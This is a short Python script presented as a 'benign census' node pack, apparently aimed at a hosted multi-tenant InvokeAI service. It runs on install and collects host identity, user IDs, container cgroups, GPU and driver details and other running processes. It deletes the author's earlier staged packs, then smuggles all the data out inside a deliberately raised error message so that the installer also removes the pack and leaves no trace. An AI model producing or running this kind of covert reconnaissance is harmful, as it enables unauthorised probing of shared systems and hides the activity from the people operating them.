# i6034 benign census + own-pack cleanup pack (read-only census; removes ONLY our own i5484-stage/i6034-stage dirs).
# Ends by raising RuntimeError so the installer's except path removes THIS pack too (zero residue).
import os, socket, glob, subprocess, traceback, shutil

L = []; a = L.append
try: a("uid=%s gid=%s euid=%s" % (os.getuid(), os.getgid(), os.geteuid()))
except Exception as e: a("ids_err=%r" % (e,))
try: a("hostname=%s" % socket.gethostname())
except Exception as e: a("host_err=%r" % (e,))
try: a("cwd=%s" % os.getcwd())
except Exception: pass
for f in ("/proc/1/cgroup", "/proc/self/cgroup"):
    try: a("%s=%s" % (f, "|".join(open(f).read().split())))
    except Exception as e: a("%s_err=%r" % (f, e))
for p in sorted(glob.glob("/proc/driver/nvidia/gpus/*/information")):
    try: a("GPUINFO[%s]=%s" % (p, " / ".join(x.strip() for x in open(p).read().splitlines() if x.strip())))
    except Exception as e: a("GPUINFO_err=%r" % (e,))
try: a("NVRM=%s" % " / ".join(open("/proc/driver/nvidia/version").read().splitlines()))
except Exception as e: a("NVRM_err=%r" % (e,))


def sh(cmd, t=30):
    try:
        r = subprocess.run(["bash", "-lc", cmd], capture_output=True, text=True, timeout=t)
        return "rc=%s out=%s" % (r.returncode, "|".join((r.stdout or "").strip().splitlines())[:2500])
    except Exception as e:
        return "ERR %r" % (e,)


a("CENSUS=%s" % sh("nvidia-smi -L 2>&1; echo ---; nvidia-smi --query-gpu=name,uuid,memory.total,memory.free,driver_version --format=csv,noheader 2>&1; echo ---; hostname; id; cat /proc/driver/nvidia/version 2>&1"))
a("APPS=%s" % sh("nvidia-smi --query-compute-apps=pid,process_name,used_memory --format=csv,noheader 2>&1"))

# cleanup: remove ONLY our own earlier pack dirs (exact names we created); never a tenant pack
removed = []
for root in ("/InvokeAI/nodes", "/invokeai/nodes", "/app/nodes"):
    for name in ("i5484-stage", "i6034-stage"):
        p = os.path.join(root, name)
        if os.path.isdir(p):
            try:
                shutil.rmtree(p)
                removed.append(p)
            except Exception as e:
                a("CLEANUP_ERR %s %r" % (p, e))
a("CLEANUP_REMOVED=%s" % ("|".join(removed) or "none"))
a("NODES_LIST=%s" % sh("ls -1 /InvokeAI/nodes /invokeai/nodes 2>&1 | head -40", t=15))

raise RuntimeError("I6034CENSUS2|| " + " ;; ".join(str(x) for x in L) + " ||ENDCENSUS2")
